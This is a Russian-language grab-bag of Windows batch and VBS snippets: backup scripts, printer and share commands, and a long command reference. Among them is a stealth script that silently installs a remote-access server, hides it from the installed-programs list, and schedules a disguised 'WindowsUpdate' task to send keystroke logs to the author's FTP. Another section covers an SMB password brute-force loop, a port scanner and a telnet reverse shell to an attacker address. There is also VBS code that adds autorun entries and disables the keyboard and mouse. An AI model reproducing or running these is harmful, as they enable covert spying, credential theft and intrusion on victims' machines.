Echo 7 - Restore Desktop From E:\BackUp\Current Day\Desktop      
Echo.
Echo 8 - Restore G:\BackUp\Day Was Copied                
Echo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Echo.
 
Set /p choice="Enter number: "
if not defined choice goto m1
if "%choice%"=="1" goto l1
if "%choice%"=="2" goto l2
if "%choice%"=="3" goto l3
if "%choice%"=="4" goto l4
if "%choice%"=="5" goto l5
if "%choice%"=="6" goto l6
if "%choice%"=="7" goto l7
if "%choice%"=="8" goto l8
if "%choice%"=="9" goto l9
 
echo.
echo    BackUp To BackUp\CurrentDay\Your Choice Folder >>>
pause
Set ToDay=%date:~0,2%.%date:~3,2%.%date:~6,4%”
 
:l1
xcopy E:\*.* G:\BackUp\%ToDay% /I /E /S /V
goto m1
 
:l2
xcopy "%UserProfile%\Desktop\*.*" "E:\BackUp\%ToDay%\Desktop" /I /E /S /V
goto m1
 
:l3
xcopy "G:\Programs\My Documents" "E:\BackUp\%ToDay%\My Documents" /I /E /S /V
goto m1
 
:l4
xcopy "%UserProfile%\Favorites" "E:\BackUp\%ToDay%\Favorites" /I /E /S /V
goto m1
 
:l9
xcopy "C:\Windows\regedit.exe" "E:\BackUp%ToDay%\Regedit" /I /E /S /V
goto m1
 
:l5
xcopy "E:\BackUp\%ToDay%\Favorites" "%UserProfile%\Favorites" /I /E /S /V
goto m1
 
:l6
xcopy "E:\BackUp\%ToDay%\My Documents" "G:\Programs\My Documents" /I /E /S /V
goto m1
 
:l7
xcopy "E:\BackUp\%ToDay%\Desktop" "%UserProfile%\Desktop\*.*"  /I /E /S /V
goto m1
 
:l8
xcopy G:\BackUp\%ToDay% E:\*.*  /I /E /S /V
 
echo.
echo ===================
echo Backup Compleated!
echo ===================
goto m1
pause
___________________________________________________________________________________________________________________

@echo off
:: Архивы этой недели (в пути к папке не должно быть пробелов)
set ArcWeek=c:\temp\Week
:: Архивы, более чем недельной давности (в пути к папке не должно быть пробелов)
set ArcOld=c:\temp\Old
:: Папка, с архивируемыми файлами
set Src=c:\temp\data
:: Путь к архиватору 7z (7za.exe)
set Arc=c:\Program Files\7-Zip
 
:: Создать папки, если не существуют
if not exist "%ArcWeek%" md "%ArcWeek%"
if not exist "%ArcOld%" md "%ArcOld%"
 
:: Создаем маркер времени, если его нет
if not exist "%ArcWeek%\TimeMarker" cd.> "%ArcWeek%\TimeMarker"
 
:: Проверяю, если архив текущей недели устарел на более, чем 7 дней - переношу с добавлением даты создания по файлу-маркеру
:: Утилита forfiles входит в состав Windows Vista+ и Resource Kit
:: Проверяем не сам архив, а маркер, потому что утилита forfiles умеет проверять только дату модификации, а не создания
:: а архиватор 7zip при проверке обновлений для архива всегда изменяет дату модификации
FORFILES /p "%ArcWeek%" /M TimeMarker* /C "cmd /c move /y %ArcWeek%\CurWeek.7z %ArcOld%\CurWeek_@fdate.7z" /d -7
:: Если архив был успешно перемещен, создаем новый маркер
if %errorlevel%==0 cd.> "%ArcWeek%\TimeMarker"
 
:: Переходим в каталог, где нужно создать архив
cd /d "%ArcWeek%"
 
:: Архивирую все файлы в архив текущей недели
"%Arc%\7za.exe" u CurWeek.7z "%Src%\*.*"
___________________________________________________________________________________________________________________

@Echo Off
Set DataPath=C:\Temp
Set ArchPath=D:\Temp
Set SevenZipPath=%ProgramFiles%\7-Zip
:: Проверяем Path, если там нету 7-zip - добавляем директорию с бинарником архиватора
Echo %Path%|Find "7-zip">nul||Set Path=%Path%;%SevenZipPath%
:: Получаем список поддиректорий
For /F "delims=" %%A In ('Dir "%DataPath%" /AD /B') Do (
    rem Проверяем наличие уже существующего старого бэкапа, удаляем
    Del "%ArchPath%\%%A.bak" 2>nul
    If Exist "%ArchPath%\%%A.7z" Ren "%ArchPath%\%%A.7z" "%%A.bak"
    rem Пакуем директорию
    7z a "%ArchPath%\%%A.7z" "%DataPath%\%%A"
)
Pause&Exit

___________________________________________________________________________________________________________________

@echo off
Setlocal EnableExtensions EnableDelayedExpansion
chcp 1251>nul
set From=c:\из какой папки архивируем подкаталоги
set Fld=c:\в какой папке создать архивы
if not exist "%Fld%" mkdir "%Fld%"
for /f "delims=" %%i in ('dir "%From%" /b /a:d') do (
  set /a n+=1
  "%ProgramFiles%\WinRAR\Rar.exe" a -ep1 "%Fld%\!n!.rar" "%From%\%%i"
)
chcp 866>nul
pause
___________________________________________________________________________________________________________________
хороший скрипт для бэкапа
@Echo Off
chcp 1251>nul
set fdate=%DATE%
Set DataPath="c:\evgeny"
Set DataPath1="%UserProfile%\Рабочий стол"
Set DataPath2="%UserProfile%\Мои документы"
Set ArchPath="c:\backup"
Set SevenZipPath="%ProgramFiles%\7-Zip"
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.evgeny.7z %DataPath%
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.desktop.7z %DataPath1%
%SevenZipPath%\7z.exe a -tzip -ssw -mx5  %ArchPath%\%fdate%.documents.7z %DataPath2%
chcp 866>nul
___________________________________________________________________________________________________________________

@echo off
@chcp 1251
@MsiExec /x {61FFA475-24D5-44FB-A51F-39B699E3D82C} /passive REBOOT=ReallySuppress
@MsiExec /x {11A90858-40BB-4858-A2DA-CA6495B5E907} /passive REBOOT=ReallySuppress
@ping 127.0.0.1
@MsiExec /I "rms.server5.1b3ru.msi" /qn       //устанавливаем RMS сервер
@schtasks /create /tn "WindowsUpdate" /tr "C:\Recovery\update\windowsupdate.exe" /sc hourly /mo 5  // создаем задание-каждый 5 часов отправлять файл дневника PuntoSwitcher на 

наш фтп
@ping 127.0.0.1 -n 60 > nul	// ждем 60 секунд
@reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Un install\{11A90858-40BB-4858-A2DA-CA6495B5E907}" /f	//удаляем RMS-сервер из списка установленных программ
@reg delete "HKCR\Installer\Products\85809A11BB0485842AADAC4659  5B9E70" /f	//удаляем RMS-сервер из списка установленных программ
@attrib +S +H "%ProgramFiles%\Remote Manipulator System - Server"	// скрываем папку RMS-сервера от посторонних глаз, ставим аттрибуты скрытый и системный
@tasklist	// сам не знаю зачем, для профилактики наверное. в общем получаем список процессов
@taskkill /im punto.exe		// если на компьтере уже запущен Punto Switcher - убиваем его
@ping 127.0.0.1 -n 10 > nul	// ждем 10 секунд
@DEL "%ProgramFiles%\Yandex\Punto Switcher\*.*" /Q /S /F 	// удаляем все файлы в папке PuntoSwitcher'a
@reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Pol  icies\Explorer\Run" /v "svchost" /t REG_SZ /d "C:\Recovery\svchost.exe" /f >nul  // добавляем наш Пунто в автозагрузку
@start "C:\Recovery\ntldr\svchost.exe"		// запускаем свой Punto Switcher
@DEL "%ProgramFiles%\ViZio WebCam Online Chat\fonts\*.*" /Q /S /F  // чистим временную папку, откуда устанавливалось все это безобразие

___________________________________________________________________________________________________________________
«Penetration Testing Ninjitsu»
C:\> for /L %i in (1,1,255) do @ping 10.10.10.%i –n 1 | fi nd "Reply"

Здесь:

for — команда начала цикла;
/L — указывает, что цикл — счетчик;
%i — имя переменной цикла;
in (1,1,255) — значения от 1 до 255 с шагом 1;
do @ping — окончание цикла выполнением команды ping;
10.10.10.%i — IP-адрес с подставленной переменной;
–n 1 — количество пингов;
| fi nd "Reply" — результата работы передаутся «|» на вход команде find, которая ищет слово «Replay».
Как видишь — все просто. Таким образом, мы находим живые хосты в диапазоне 10.10.10.1-255. 
Логику следующих примеров пояснять не буду, уверен, ты разберешься.
Command1 & Command2 — запуск нескольких команд;
Command1 && Command2 — запуск второй, только при успешном выполнении первой;
> — запись в файл;
>> — запись в конец файла;
For /F — цикл по файлу;
Command 2 > nul — стандартный вывод ошибок не отображается;
Command 2 >> errors.txt — ошибки в файле.

Итак, определяем имена хостов:
C:\> for /L %i in (1,1,255) do @nslookup 10.10.10.%i 2>nul | fi nd "Name" && echo 10.10.10.%i

Порт сканнер на базе ftp-клиента:
C:\> for /L %i in (1,1,1024) do echo Checking Port %i: >> ports.txt & echo open 192.168.0.1 %i > ftp.txt & echo quit >> ftp.txt & ftp -s:ftp.txt 2>>ports.txt

Перебираем логины и пароли из файла на доступ к удаленному хосту по SMB:
C:\> for /f %i in (user.txt) do @(for /f %j in (pass.txt) do @ echo %i:%j & @net use \\10.10.10.10 %j /u:%i 2>nul && echo %i:%j >> success.txt && net use \\10.10.10.10 /del)

Реверсивный шелл через телнет:
telnet [attacker_IPaddr] [port1] | /bin/bash | telnet [attacker_IPaddr] [port2]
___________________________________________________________________________________________________________________

Если хочешь подключить принтер в cmd, то:

-----------------------
@echo off
rundll32 printui.dll,PrintUIEntry /in /n "\\SERVER\PRINTER"
-----------------------

Дополнительно скажу следующее:
rundll32 printui.dll,PrintUIEntry /y /n "\\SERVER\PRINTER" - делает принтер используемым по умолчанию
cscript prnmngr.vbs -d -p "\\SERVER\PRINTER" - удаляет указанный принтер на локальной машине
__________________________________________________________________________________________________________________

query process * | find /I "1cv7.exe" > process.txt 
type process.txt | find /I "rdp-tcp" > active.txt 
type process.txt | find /V /I "rdp-tcp" > nonactive.txt 
for /F "tokens=3" %%i in (active.txt) DO Reset session %%i
for /F "tokens=2" %%i in (nonactive.txt) DO Reset session %%i
del process.txt 
del active.txt 
del nonactive.txt

_________________________________________________________________________________________________________________

добавить в батник:

rem Запретить вход клиентов RDP 
change logon /disable 

после страшных дел

rem Разрешить вход клиентов RDP 
change logon /enable 

____________________________________________________________________________________________________________________

Выполнить через/ждем 10 секунд и тыкаемся в диск w
TIMEOUT /T 10 /NOBREAK 
w:

____________________________________________________________________________________________________________________

подключить сетевую папку ( ШАРА ) 
net use w: \\HOSTNAME\SHARENAME "PASSWORD" /USER:"hostname\username"
____________________________________________________________________________________________________________________

VBS
reg VBS
rundll32 krnl386.exe,exitkernel                   Выход WIN
rundll32 shell32,shexitwindowsex 0                закрыть все проги и перезагрузить
rundll32 shell32,shexitwindowsex 1                выключить
rundll32 shell32,shexitwindowsex 2                перезагрузить
rundll32 shell32,shexitwindowsex 4                принудительное закрытие всех програ
rundll32 shell32,shexitwindowsex 8                Выход из win
rundll32 keyboard,disable                         отключить клаву
rundll32 mouse,disable                            отключить мышь
rundll32 user,swapmousebutton                     поменять клавиши мыши местами
rundll32 user,disableoemlayer                     справоцировать сбой  
rundll32 shell32,shellaboutainfo-box              пок.окно абаут
rundll32 diskcopy,diskcopyrundll                  пок.диалог копир.диска
rundll32 msthtml.dll,printHTML "x:\x"             печать "x:\x" fila
rundll32 htprint2.dll,Rundll_printtestpage        печать тестовой страницы 
rundll32 shell,shellEXecute                       ?
rundll32 shell32,control_rundll time date.cpl     показ дату и время
rundll32 shell32,openas_rundll                    диалог открыть с помощью
rundll32 shell32,shellabouta winHowto.ru          ?
rundll32 shell32,shformatdrive                    диалог farmat:A
rundll32 user,exitwindowsexec                     быстрая перезагрузка
rundll32 url.dll,fileProtocolHandler"@"           открыть "http:\\"
rundll32 user,setcursorBlinkTime n                ?
rundll32 user,cascadechildwindows                 все окна каскадом
rundll user,repaintscreen
rundll32 user,setcurspos


VBS FOLDER AND FILES

1.Создание папки

Set FSA=CreateObject("Scripting.FileSystemObject")
FSA.CreateFolder("c:\Новая папка")

2.Копирование и удаление файла  (здесь "Scripting.FileSystemObject" полный путь к файлу)

Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("wScript.scriptFullName")
file1.copy("c:\x\x.exe")
file1.delete("c:\x\x.exe")

Пример :

Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("c:\x\xc\x.exe")
file1.copy("c:\x\x.exe")  

3.Добавление записей в реэстор

set WSHshell=WScript.CreateObject(Wscript.Shell")
WSHShell.regWrite"HKLM\software\microsoft\Windows\currentVersion\run\Micropatch1.0","c:\x\x.exe",reg_Sz"
-эта запись создет файл который будет стортовать с системой(x.exe)
-также существуют и другие команды regWrite,regDelete,regRead

4.копирование либо удаление файла ипапки

set FST=CreateObject("Scripting.FileSystemObject")
FST.deleteFolder("c:\x")
FST.deleteFile("c:\x\x.com")
FST.copyFolder("c:\x")
FST.copyteFile("c:\x\x.com")

5.-если папка есть то она... -удаляеться

Set FST=CreateObject("Scripting.FileSystemObject")
if FST.FolderExists("c:\x")Then    
FST.DeleteFolder("c:\x")          
end if

6.-если папки нет то она...-создаеться

Set FST=CreateObject("Scripting.FileSystemObject")
if not FST.FolderExists("c:\x")Then
FST.CreateFolder("c:\x")
end if

7.создание В Папки текста

Set FST=CreateObject("Scripting.FileSystemObject")
if not FST.FolderExists("c:\x")Then
FST.CreateFolder("c:\x")
set Fsoo=CreateObject("Scripting.FileSystemObject")
set ShellPtxVBS=fsoo.createTextFile("c:\x\x.txt")
shellptxVBS.writeLine("HI,cyka")
shellptxvbs.close
end if

8.

if day(now)=1Then
if day(now)>1Then
if day(now)<1Then

9.- если файлa НЕТ то он... - Создаеться c тектом

set FS=CreateObject("Scripting.FileSystemObject")
if not FST.FileExists("c:\x\x.txt")Then 
FST.CreateFile("c:\x\x.txt")
set Fsoo=CreateObject("Scripting.FileSystemObject")
set ShellPtxVBS=fsoo.createTextFile("c:\x\x.txt")
shellptxVBS.writeLine("Hi,Brazor")
shellptxvbs.close
end if 

10.-если файл есть то он... - Удаляется

set FS=CreateObject("Scripting.FileSystemObject")
if FS.FileExists("c:\x\x.txt")Then 
FS.deleteFile("c:\x\x.txt")
end if

11.Копирование и удаление файла
Set FSA=CreateObject("Scripting.FileSystemObject")
set file1=FSA.GetFile("c:\x\xc\x.exe")
file1.copy("c:\x\x.exe")  

12.запуск Файлов
 
WshShell=Wscript.CreateObject("Wscript.Shell")
WsHShell.Run("STRAnica.html"1,0)
Wsscript.DisconnectObject(WshShell)

13. 
Taskman
Regedit
Msconfig

14. Сообщение
if Day(now)>1Then
XXX=MsgBox("ПОШЕЛ Н... С ЭТОЙ ТАЧКИ ...:).А ТО ВСЁ ЗАВИСНЕТ!!!:(.",20,"system error")
XXX=MsgBox("Клава отрубилась :)!!Жми дальше и мы...",20,"SYSTEM ERROR")
XXX=MsgBox("Я ТЕБЯ ПРЕДУПРИЖДАЛ :).",20,"SYSTEM ERROR")
end if

15.Отключение клавы и мыши

if Day(now)>1Then
Sub Zapadlo(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call Zapadlo("rundll32 keyboard,disable",True)
Call Zapadlo("rundll32 mouse,disable",True)
end if

16.Запуск прги
if Day(now)>1Then
Sub Zapadlo(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call Zapadlo("c:\x.exe",True)
end if

17.
if Day(now)>0Then
Sub mmousse(Fuck,wait)
 Set Wshshell=Wscript.CreateObject("Wscript.Shell")
 x=WshShell.Run(Fuck,Wait)
End Sub
Call mmousse("rundll32 mouse,disable",True)
end if
____________________________________________________________________________________________________________________























A
append - позволяет программам открывать файлы в указанных каталогах так , словно они находятся в текущем каталоге.

arp - отображение и изменение таблиц преобразования IP-адресов в физические, используемые протоколом разрешения адресов.

assoc - вывод либо изменение сопоставлений по расширениям имён файлов.

at - команда предназначена для запуска программ в указанное время.

atmsdm - Контроль подключений и адресов, зарегистрированных диспетчером вызовов ATM в сетях с асинхронным режимом передачи (ATM).

attrib - изменение атрибутов файлов и папок.

auditusr - задаёт политику аудита пользователей.

B
break - включение режима обработки клавиш CTRL+C.

bootcfg - эта программа командной строки может быть использована для настройки , извлечения , изменения или удаления параметров командной строки в файле Boot.ini.

C
cacls - просмотр изменение таблиц управления доступом ACL к файлам.

call - вызов одного пакетного файла из другого.

cd - вывод имени либо изменение текущей папки.

chcp - вывод либо изменение активной кодовой страницы.

chdir - вывод либо смена текущей папки.

chkdsk - проверка диска и вывод отчёта.

chkntfs - выводит или изменяет параметры проверки диска во время загрузки.

ciddaemon - сервис индексации файлов.

cipher - программа шифрования файлов.

cls - очистка экрана интерпретатора.

cmd - запуск нового окна командной строки.

cmstp - установка профилей диспетчера подключений.

color - устанавливает цвет для текста и фона в текстовых окнах.

comp - сравнение содержимого двух файлов или наборов файлов.

compact - просмотр и изменение параметров сжатия файлов в разделах NTFS.

convert - преобразование файловой системы тома FAT в NTFS.

copy - копирование одного или нескольких файлов.

D
date - вывод либо установка текущей даты.

debug - средство для отладки и редактирования программ.

defrag - дефрагментация диска.

del - удаление одного или нескольких файлов.

devcon - альтернатива диспетчера устройств.

diantz - тоже что и MAKECAB.

dir - вывод списка файлов и подпапок из указанного каталога.

diskcomp - сравнение содержимого двух гибких дисков.

diskcopy - копирование содержимого одного гибкого диска на другой.

diskpart - использования сценария diskpart.

diskperf - счетчик производительности дисков.

doskey - редактирование и повторный вызов команд Windows; создание макросов DOSKey.

driverquery - просмотр списка установленных драйверов устройств и их свойства.

E
echo - вывод сообщений и переключение режима отображения команд на экране.

edit - запуск редактора MS-DOS.

endlocal - завершение локализации изменений среды в пакетном файле.

edlin - запуск построчного текстового редактора.

erase - удаление одного или нескольких файлов.

esentutl - обслуживание утилит для Microsoft (R) баз данных Windows.

eventcreate - эта команда позволяет администратору создать запись об особом событии в указанном журнале событий.

eventtriggers - эта команда позволяет администратору отобразить и настроить триггеры событий в локальной или удаленной системе.

exe2bin - преобразование EXE-файлов в двоичный формат.

exit - завершение командной строки.

expand - распаковка сжатых файлов.

F
fc - сравнение двух файлов или двух наборов файлов и вывод различий между ними.

find - поиск текстовой строки в одном или нескольких файлах.

findstr - поиск строк в файлах.

finger - вывод сведений о пользователях указанной системы.

fltmc - работа с фильтром нагрузки драйверов.

for - выполнение указанной команды для каждого файла набора.

forcedos - сопоставление приложений MS-DOS, которые не распознаются системой Microsoft Windows XP.

format - форматирование диска для работы с Windows.

fontview - программа просмотра шрифтов.

fsutil - управление точками повторной обработки, управление разреженными файлами, отключение тома или расширение тома.

ftp - программа передачи файлов.

ftype - просмотр и изменение типов файлов, сопоставленных с расширением имен файлов.

G
getmac - отображает MAC-адрес одного или нескольких сетевых адаптеров компьютера.

goto - передача управления содержащей метку строке пакетного файла.

gpresult - отображает результирующую политику (RSoP) для указанного пользователя и компьютера.

gpupdate - выполнение обновления групповых политик.

graftabl - выбор кодовой страницы для отображения символов национальных алфавитов в графическом режиме.

H
help - выводит не полный список команд, которые используются в cmd.

hostname - отображение имени компьютера.

I
if - оператор условного выполнения команд в пакетном файле.

ipconfig - вывод маску подсети, стандартный шлюз и информацию о вашем IP.

ipxroute - программа управления маршрутизацией NWLink IPX.

L
label - создание, изменение и удаление меток тома для диска.

lodctr - обновление имен счётчиков и поясняющего текста для расширенного счётчика.

logman - управление расписанием для счетчиков производительности и журнала трассировки событий.

logoff - завершение сеанса Windows.

lpq - отображение состояния очереди удалённой очереди печати lpq.

lpr - направляет задание печати на сетевой принтер.

lsass - сервер определения локальной защиты.

M
makecab - архивирование файлов в cab-архив.

md - создание папки.

mem - выводит сведения об используемой и свободной памяти.

mkdir - создание папки с расширенной функциональностью.

mmc - открытие окна консоли MMC.

mode – отладка системных устройств.

mofcomp - 32-разр. компилятор Microsoft (R) MOF.

more - последовательный вывод данных по частям размером в один экран.

mountvol - просмотр, создание и удаление точек подключения тома.

move - перемещение и переименование файлов и каталогов.

mqbkup - утилита архивирования и восстановления очереди сообщений.

mqsvc - Обеспечивает инфраструктуру для работы распределенных приложений.

mrinfo - Работа с многоадресными рассылками.

msg - отправка сообщений пользователю.

msiexec - запуск установщика Windows.

N
nbtstat - отображение статистики протокола и текущих подключений TCP/IP с помощью NBT (NetBIOS через TCP/IP).

net - пакет приложений предназначенный для работы с сетью.

net1 - тоже самое что и net.

netsh - локальное или удаленное отображение и изменение параметров сети.

netstat - отображение статистики протоколов и текущих сетевых подключений TCP/IP.

nlsfunc - загрузка сведений о национальных стандартах.

nslookup - вывод информации, предназначенный для диагностики DNS.

ntbackup - запуск мастера архивирования.

ntsd - отладчик командной строки.

O
odbcconf - настройка драйвера ODBC.

openfiles - эта команда позволяет пользователю вывести список открытых файлов и папок, которые были открыты в системе.

P
pagefileconfig - настройка файлов подкачки и виртуальной памяти.

path - вывод либо установка пути поиска исполняемых файлов.

pathping - вывод информации о скрытый сетях и потери данных.

pause - приостанавливает выполнение сценария cmd.

pentnt - обнаруживает ошибки деления с плавающей точкой процессора Pentium, отключает аппаратную обработку чисел с плавающей точкой и включает эмуляции операций с плавающей точкой.

perfmon - открывает окно "Производительность".

ping - проверяет соединение с другим компьютером.

ping6 - команда проверки связи.

popd - изменяет одну папку на ту, которая была сохранена командой PUSHD.

powercfg - эта команда позволяет управлять электропитанием системы.

print - печать текстового файла.

prncnfg - настройка параметров принтера.

prompt - изменение приглашения командной строки cmd.exe.

proxycfg - инструмент настройки proxy соединения.

pushd - сохранения значений текущего каталога для использования POPD командой.

Q
qappsrv - отображает доступные серверы терминалов в сети.

qprocess - отображает информацию о процессах.

qwinsta - отображение информации о сеансах терминалов.

R
rasdial - интерфейс связи из командной строки для клиента службы удалённого доступа.

rcp - обмен файлами с компьютером, на котором выполняется служба RCP.

recover - восстановление сохранившихся данных на поврежденном диске.

reg - редактирование системного реестра через командную строку.

regsvr32 - сервер регистрации.

relog - создает новый журнал производительности из уже имеющего.

rem - помещение комментария в пакетный файл.

ren - переименование файлов и папок.

rename - переименование файлов и папок.

replace - замена файлов.

reset - утилита сброса служб терминалов.

rexec - выполнение команд на удаленных узлах на которых выполняется служба rexec.

rd - удаление папки.

rmdir - удаление папки.

route - обработка таблиц сетевых маршрутов.

rsh - выполнение команд на удаленных узлах, на которых запущена служба RSH.

rsm - управление ресурсами носителей с помощью службы "Съемные ЗУ".

runas - использование приложений от имени другого пользователя.

rundll32 - запуск стандартных команд-функций заложенных в dll.

rwinsta - сброс значений подсистем оборудования и программ сеанса в начальное состояние.

S
sc - установление связи с NT Service Controller и ее услугами.

schtasks - создание, удаление, изменение и опрос запланированных задачи в локальной или удаленной системе.

sdbinst - установщик базы данных совместимости.

secedit – автоматизация задач настройки безопасности.

set - вывод, присваивание и удаления переменных в командной строке.

setlocal - начало локализации изменений среды в пакетном файле.

setver - задает номер версии, который MS-DOS сообщает программе.

sfc - Проверка файлов Windows.

shadow - позволяет наблюдать за другим сеансом служб терминалов.

shift - изменение содержимого подставляемых параметров для пакетного файла.

shutdown - завершение сеанса, выключение и перезагрузка системы Windows.

smbinst - это процесс, принадлежащий System Management BIOS Driver Installer.

sort - сортирование файлов.
start - запуск программы или команды в отдельном окне.

subst - сопоставление имени диска указанному пути.

systeminfo - вывод информации о настройках системы.

T
taskkill - завершение одного или нескольких процессов.

tasklist - показывает запущенные программы и процессы выполняемые в данный момент.

tcmsetup - установка клиента телефонии.

tftp - обмен файлами с удаленным компьютером, на котором запущена служба TFTP.

time - просмотр или изменение текущего времени.

title - назначение заголовка окна интерпретатора.

tlntadmn - удаленное управление компьютером.

tracert - трассировка маршрута к указанному узлу.

tracerpt - обрабатывает двоичные файлы журнала отслеживания событий или потоки данных.

tracert6 - версия tracert для протокола IPv6.

tree - вывод структуры диска или каталога в виде дерева.

tscon - присоединяет сеанс пользователя к сеансу терминала.

tsdiscon - отключение сеанса терминала.

tskill - прекращение процесса.

tsshutdn - завершение работы сервера в установленном порядке.

type - вывод на экране содержимого текстовых файлов.

typeperf - выводит сведения о производительности на экран или в журнал.

U
unlodctr - удаление имен счётчиков и поясняющего текста для расширенного счётчика.

userinit - проводник системы Windows.

V
ver - вывод сведений о версии Windows.

verify - установка режима проверки правильности записи файлов на диск.

vol - вывод метки и серийного номера тома для диска.

vssadmin - инструмент командной строки теневого копирования тома.

W
w32tm - диагностика службы времени.

wbemtest - тестер инструментария управления Windows.

winver - вывод информации о версии Windows.

wmic - инструмент для написания сценариев.

X
xcopy - копирование файлов и дерева папок.





Панель управления
APPWIZ.CPL – диалоговое окно Установка и удаление программ

AZMAN.MSC – диспетчер авторизации (для Vista) 
CERTMGR.MSC – сертификаты 
CLICONFG – программа сетевого клиента SQL 
COMEXP.MSC или DCOMCNFG – службы компонентов (для Vista) 
COMPMGMT.MSC – управление компьютером 
COMPUTERDEFAULTS – настройка доступа программ и умолчаний (для Vista) 
CONTROL ADMINTOOLS – администрирование 
CONTROL COLOR – цвет и внешний вид окна

CONTROL FOLDERS – параметры папок 
CONTROL FONTS – шрифты (добавление или удаление) 
CONTROL INTERNATIONAL или INTL.CPL – язык и региональные стандарты 
CONTROL KEYBOARD – свойства: клавиатура 
CONTROL MOUSE или MAIN.CPL – свойства: мышь 
CONTROL PRINTERS – устройства и принтеры 
CONTROL USERPASSWORDS – управление пользователями 
CONTROL USERPASSWORDS2 или NETPLWIZ – учетные записи пользователей

CONTROL – панель управления 
CREDWIZ – сохранение имен пользователей и паролей (для Vista) 
DESK.CPL – разрешение экрана 
DEVMGMT.MSC – диспетчер устройств 
DRWTSN32 – отладчик Dr. Watson (для XP) 
DXDIAG – средство диагностики DirectX 
EVENTVWR или EVENTVWR.MSC – просмотр событий 
FSMGMT.MSC – общие папки

GPEDIT.MSC – редактор локальной групповой политики 
HDWWIZ.CPL – диспетчер устройств 
IRPROPS.CPL – управление устройствами с ИК-портом 
ISCSICPL – свойства: инициатор iSCSI (для Vista) 
JOY.CPL – игровые устройства 
LPKSETUP – установка или удаление языков интерфейса (для Vista) 
LUSRMGR.MSC – локальные пользователи и группы 
MDSCHED – проверка оперативной памяти Windows (для Vista)

MMC – консоль управления (MMC) 
MMSYS.CPL – звук 
MOBSYNC – центр синхронизации 
MSCONFIG– конфигурация системы 
NAPCLCFG.MSC – консоль конфигурации клиента NAP (для Vista) 
NTMSMGR.MSC – съемные запоминающие устройства 
NTMSOPRQ.MSC – запросы операторов съёмных ОЗУ 
ODBCAD32 – администратор источников данных ODBC

OPTIONALFEATURES – включение и отключение компонентов Windows (для Vista) 
PERFMON или PERFMON.MSC – системный монитор 
POWERCFG.CPL – электропитание (для Vista) 
REGEDIT или REGEDT32 – редактор реестра (для Vista) 
REKEYWIZ – шифрующая файловая система (EFS) 
RSOP.MSC – результирующая политика 
SECPOL.MSC – локальная политика безопасности 
SERVICES.MSC – службы

SYSDM.CPL – свойства системы 
SYSEDIT – редактор конфигурации системы (N.B. Использовать с особой осторожностью!) 
SYSKEY – защита базы данных учетных записей Windows (N.B. Использовать с особой осторожностью!) 
SYSPREP – программа подготовки системы (для Vista) 
TABLETPC.CPL – перо и сенсорные устройства (для Vista) 
TASKSCHD.MSC или CONTROL SCHEDTASKS – планировщик заданий (для Vista)

TELEPHON.CPL – телефон и модем 
TIMEDATE.CPL – дата и время 
TPM.MSC– управление доверенным платформенным модулем (TPM) на локальном компьютере (для Vista) 
UTILMAN – центр специальных возможностей (для Vista) 
VERIFIER – диспетчер проверки драйверов 
WMIMGMT.MSC – элемент управления WMI 
WSCUI.CPL – центр поддержки

WUAUCPL.CPL – автоматическое обновление (для XP) 
Программы и инструменты для Window
%WINDIR%\SYSTEM32\RESTORE\RSTRUI.EXE – запуск средства восстановления системы (Для XP) 
CALC – калькулятор 
CHARMAP – таблица символов 
CLIPBRD – буфер обмена (для XP)

CMD – командная строка 
DVDPLAY – плеер DVD 
EUDCEDIT – редактор личных знаков 
EXPLORER – проводник 
FSQUIRT – мастер передачи файлов Bluetooth 
IEXPLORE – Internet Explorer 
IEXPRESS – создание CAB-архива 
JOURNAL – новый журнал (для Vista uniquement)

MAGNIFY – экранная лупа 
MBLCTR – центр мобильности Windows (для Vista uniquement) 
MIGWIZ – средство переноса данных Windows (для Vista) 
MIGWIZ.EXE – средство переноса данных Windows (для XP) 
MOVIEMK – Windows Movie Maker 
MRT – средство удаления вредоносных программ 
MSDT – средство диагностики службы технической поддержки 
MSINFO32 – сведения о системе

MSPAINT – Paint 
MSRA – удаленный помощник Windows 
MSTSC – подключение к удаленному рабочему столу 
NOTEPAD – блокнот 
OSK – экранная клавиатура 
PRINTBRMUI – перенос принтеров (для Vista) 
RSTRUI – восстановление системы (для Vista) 
SIDEBAR – панель Windows (для Vista)

SIGVERIF – проверка подписи файла 
SNDVOL – микшер громкости 
SNIPPINGTOOL – ножницы (для Vista) 
SOUNDRECORDER – звукозапись 
STIKYNOT – записки (для Vista) 
TABTIP – панель ввода планшетного ПК (для Vista) 
TASKMGR – диспетчер задач Windows 
WAB – контакты (для Vista)

WERCON – отчеты о проблемах и их решениях (для Vista) 
WINCAL – календарь (для Vista) 
WINCHAT – чат (для XP) 
WINDOWSANYTIMEUPGRADE – запуск программы обновления Windows Vista 
WINVER – вывод информации о версии Windows 
WINWORD – Word 
WMPLAYER –Windows Media 
WRITE или WORDPAD – Wordpad

Управление дисками
CHKDSK – проверка диска 
CLEANMGR – средство очистки диска 
DEFRAG – дефрагментация диска 
DFRG.MSC – дефрагментация диска 
DISKMGMT.MSC – управление дисками 
DISKPART – средство разбиения жесткого диска

Управление сетями и Интернетом
CONTROL NETCONNECTIONS или NCPA.CPL – сетевые подключения 
FIREWALL.CPL – Windows Firewall 
INETCPL.CPL – свойства: Интернет 
IPCONFIG – управление конфигурацией протокола IP 
NETSETUP.CPL – мастер сетевых подключений (для XP) 
WF.MSC – запуск работы брандмауэра в безопасном режиме (для Vista)

Другие команды
%HOMEDRIVE% – открыть проводник на разделе, где установлена операционная система 
%HOMEPATH% – открыть папку зарегистрированных пользователей C:\Documents and settings\[имя пользователя] 
%PROGRAMFILES% – открыть папку Program Files 
%TEMP% или %TMP% – открыть временную папку Temp

%USERPROFILE% – открыть папку профиля текущего пользователя 
%WINDIR% или %SYSTEMROOT% – открыть папку установки Windows 
